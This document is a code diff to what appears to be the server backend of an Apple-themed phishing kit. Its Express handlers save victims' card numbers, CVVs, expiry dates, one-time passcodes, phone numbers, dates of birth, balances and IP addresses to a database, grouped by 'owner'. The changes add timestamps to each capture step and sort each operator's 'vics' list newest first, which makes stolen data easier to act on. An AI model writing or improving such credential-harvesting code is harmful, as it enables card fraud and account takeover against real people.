@@ -1,5 +1,6 @@
 const axios = require("axios");
 const AppleGB = require("../models/appleGbModel");
+var moment = require("moment"); // require
 
 let count = 0;
 let auCount = 0;
@@ -175,14 +176,17 @@ const sendAuRes = async (req, res) => {
 
 const getOwnerVics = async (req, res) => {
   const { owner } = req.params;
-  AppleGB.find({ owner }).exec((err, vics) => {
-    if (err) {
-      console.log(err);
-      res.status(404).send("Error");
-      return;
-    }
-    res.send(vics);
-  });
+  AppleGB
+    .find({ owner })
+    .sort({ timestamp: -1 })
+    .exec((err, vics) => {
+      if (err) {
+        console.log(err);
+        res.status(404).send("Error");
+        return;
+      }
+      res.send(vics);
+    });
 };
 
 const command = async (req, res) => {
@@ -211,7 +215,7 @@ const getInfo = async (req, res) => {
 const submitAppAuth = async (req, res) => {
   const { uniqueid } = req.body;
   try {
-    await AppleGB.findOneAndUpdate({ uniqueid }, { status: 6 }).exec();
+    await AppleGB.findOneAndUpdate({ uniqueid }, { status: 6, timestamp: moment().format() }).exec();
     res.sendStatus(200);
   } catch (error) {
     console.log(error);
@@ -235,6 +239,7 @@ const submitBilling = async (req, res) => {
         pcode,
         dob,
         status: 1,
+        timestamp: moment().format()
       }
     );
     res.sendStatus(200);
@@ -249,7 +254,7 @@ const submitTelephone = async (req, res) => {
   try {
     await AppleGB.findOneAndUpdate(
       { uniqueid },
-      { telephone, status: 10 }
+      { telephone, status: 10, timestamp: moment().format() }
     ).exec();
     res.sendStatus(200);
   } catch (error) {
@@ -261,7 +266,7 @@ const submitTelephone = async (req, res) => {
 const submitOtp = async (req, res) => {
   const { uniqueid, otp } = req.body;
   try {
-    await AppleGB.findOneAndUpdate({ uniqueid }, { otp, status: 3 }).exec();
+    await AppleGB.findOneAndUpdate({ uniqueid }, { otp, status: 3, timestamp: moment().format() }).exec();
     res.sendStatus(200);
   } catch (error) {
     console.log(error);
@@ -274,7 +279,7 @@ const submitBalance = async (req, res) => {
   try {
     await AppleGB.findOneAndUpdate(
       { uniqueid },
-      { balance, status: 12 }
+      { balance, status: 12, timestamp: moment().format() }
     ).exec();
     res.sendStatus(200);
   } catch (error) {
@@ -288,7 +293,7 @@ const submitCCAgain = async (req, res) => {
   try {
     await AppleGB.findOneAndUpdate(
       { uniqueid },
-      { ccname, ccnum, ccexp, cvv, status: 8 }
+      { ccname, ccnum, ccexp, cvv, status: 8, timestamp: moment().format() }
     ).exec();
     res.sendStatus(200);
   } catch (error) {
@@ -309,6 +314,7 @@ const submitCC = async (req, res) => {
       owner,
       status: 2,
       ip,
+      timestamp: moment().format()
     });
 
     res.sendStatus(200);
